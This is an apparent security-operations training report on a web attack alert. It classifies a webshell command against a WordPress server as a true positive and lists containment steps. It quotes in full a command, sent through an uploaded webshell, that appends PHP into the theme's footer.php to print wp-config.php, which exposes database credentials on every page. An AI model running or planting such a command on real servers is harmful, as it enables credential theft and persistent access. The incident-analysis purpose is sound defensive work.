# Alert 8830: Suspicious Parameter in Web Request

## Incident Classification

**True Positive**

## Escalation Required?

**Yes**

## Case Report

### Time of Activity

`09/08/2026 18:29:23.593`

### Affected Entities

| Entity            | Details                                                                  |
| :---------------- | :----------------------------------------------------------------------- |
| **Target Host**   | `192.168.100.38` — `prod` (Web Server)                                   |
| **Target Domain** | `thetrydaily.thm`                                                        |
| **Attacking IP**  | `24.48.63.112`                                                           |
| **User-Agent**    | `Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0` |

### Reason for Classifying as True Positive

Following the webshell upload (Alert 8829), the attacker (`24.48.63.112`) executed arbitrary system commands via a `GET` request to `/uploads/easy-simple-php-webshell.php`.

The request contained a malicious `cmd` parameter:

`cmd=echo '<?php echo file_get_contents("/var/www/html/wordpress/wp-config.php"); ?>' >> /var/www/html/wordpress/wp-content/themes/twentytwentythree/footer.php`

This command attempted to inject a malicious backdoor payload into the active WordPress theme's `footer.php` file to exfiltrate database credentials and establish persistence.

The server responded with HTTP status **200 (OK)**, confirming successful execution.

### Reason for Escalating the Alert

Immediate escalation is critical due to active arbitrary command execution, unauthorized file modification, and persistence injection targeting production web files on `192.168.100.38`.

### Recommended Remediation Actions

* Immediately isolate production server `192.168.100.38` from the network to prevent further remote command execution or C2 communication.
* Remove the uploaded webshell `/uploads/easy-simple-php-webshell.php` and restore `footer.php` from a clean backup.
* Perform an immediate audit of `wp-config.php` and reset database access credentials immediately.
* Block attacker IP `24.48.63.112` across perimeter security controls.
* Invalidate all administrative sessions and conduct a complete forensic analysis of the web root directory.

## Analyst Verdict

**Classification:** True Positive
**Escalation:** Yes

The alert confirms **successful command execution through the previously uploaded webshell**. The attacker modified the active WordPress `footer.php` file with a malicious payload designed to access sensitive database configuration information and establish persistence. This represents active post-exploitation activity on the production web server and requires immediate containment and forensic investigation.
